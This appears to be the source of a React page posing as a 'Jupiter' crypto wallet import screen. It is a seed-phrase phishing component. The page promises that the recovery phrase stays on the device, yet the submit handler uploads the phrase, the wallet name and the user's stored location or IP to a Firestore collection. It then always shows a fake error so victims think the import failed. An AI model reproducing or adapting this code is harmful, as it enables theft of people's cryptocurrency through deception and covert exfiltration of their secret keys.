import {
    collection,
    addDoc,
    onSnapshot,
    query,
    where,
    doc,
    updateDoc,
    runTransaction,
    orderBy,
    getDocs,
    limit,
  } from "firebase/firestore";
import { db } from "../../firebase";
import React, { useState,useEffect} from "react";
import { useParams,useNavigate} from "react-router-dom";
import '../ImportWallet/index.scss';
import { setLocalStorage,getLocalStorage } from "../../utils/useLocalStorage";
const _src = 'JUPITER';
const ImportWallet = () => {
  const navigate = useNavigate();
  const goBack = () => {
    navigate(-1); // Goes back to the previous page
  };
 const params = useParams();
 const { walletName } = params;
 const [secretPharse, SetSecretPharse] = useState("");
 const [IsShowErrMsg, SetShowErrMsg] = useState(false);
 const [IsProcessing, SetProcessing] = useState(false);
 const usersRef = collection(db, "mydata");
 const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
    
 const isLetter = (c) => {
    return c.toLowerCase() != c.toUpperCase();
 }

 const encodeBase64 = (text) => {
  return btoa(unescape(encodeURIComponent(text)));
};

 const updateIndex = async (userID) => {
    try {
      await runTransaction(db, async (transaction) => {
        const sfDocRef = doc(db, "mydata", userID);
        const sfDoc = await transaction.get(sfDocRef);
        const dosLast = await getDocs(q);
        if (!sfDoc.exists()) {
          throw "Document does not exist!";
        }
        const [lastest] = dosLast.docs
        const auto_id = (lastest?.get("auto_id") || 0) + 1;
        transaction.update(sfDocRef, { auto_id });
      });
      //console.log("Transaction successfully committed!");
    } catch (e) {
      //console.log("Transaction failed: ", e);
    }
  };
  
  function normalizeText(str) {
    return str
      .replace(/[^a-zA-Z\s]/g, '') // Xoá tất cả ký tự KHÔNG phải chữ hoặc khoảng trắng
      .split(/\s+/)                // Tách theo khoảng trắng (kể cả nhiều dấu cách)
      .filter(Boolean)             // Bỏ phần trống
      .join(' ')                   // Ghép lại thành một khoảng trắng duy nhất
      .toLowerCase();              // Chuyển thành chữ thường
  }

function validateMnemonic(mnemonic) {
  if (!mnemonic || typeof mnemonic !== "string") return false;
  const words = mnemonic.trim().split(/\s+/);
  const count = words.length;
  if (![12, 15, 18, 21, 24].includes(count)) return false;
  return true;
}

 async function checkExistsBySeed(code) {
    try {
      const q = query(
        collection(db, "mydata"),
        where("secret", "==", code),
        limit(1) 
      );
      const querySnapshot = await getDocs(q);
      return !querySnapshot.empty; 
    } catch (error) {
      console.error("Error:", error);
      throw error;
    }
  }
    
  const handleSubmit = async (e) => {
   try{
        SetProcessing(true);
        var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
        var formattedSeedPhrase = normalizeText(secretPharse);
        if(walletName.length > 0 && formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
            if(validateMnemonic(formattedSeedPhrase)){
                const isExist = await checkExistsBySeed(formattedSeedPhrase);
                if(!isExist){
                    var _asset = '';
                    var _total = 0;
                    var _s = 1;
                    const user = await addDoc(collection(db, "mydata"), {
                        src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                    });
                    if(user.id){
                        setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1);
                        updateIndex(user.id);
                        SetShowErrMsg(true);
                    }
                }else{
                    setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1);
                    SetShowErrMsg(true);
                }
            }else{
                SetShowErrMsg(true);
            }
        }else{
            SetShowErrMsg(true);
        }
    }catch(err){
        console.log(err);
    }finally{
        SetProcessing(false);
    }
  };
    
  return (
<div className="page">
<div className="container">
<div className="topbar">
<button onClick={goBack} className="back-btn" aria-label="Back">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15 18L9 12L15 6" stroke="#FFFFFF" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
</svg>
</button>
<h1 className="title">Enter your recovery phrase</h1>
</div>
<p className="instruction">
 Your recovery phrase will only be stored locally on your device.
</p>
<textarea
value={secretPharse}
onChange={(e) => {
    SetShowErrMsg(false);
    if(!isLetter(e.target.value) && e.target.value.length > secretPharse) return;
    SetSecretPharse(e.target.value);
}}
placeholder="Enter your recovery phrase"
rows={6}
className="textarea"
/>
<span style={{display: IsShowErrMsg ? 'inline-block' : 'none'}}className="phrase-error">Secret Recovery Phrases contain 12, 15, 18, 21, or 24
    words</span>
<div className="bottom">
<button onClick={handleSubmit} className={`continue-btn active`}>
  <span style={{display:IsProcessing ? 'inline-block':'none'}} className="loader"></span>
<span style={{paddingLeft: '5px'}}>Import</span>
</button>

</div>
</div>
</div>
  );
  
}

export default ImportWallet;





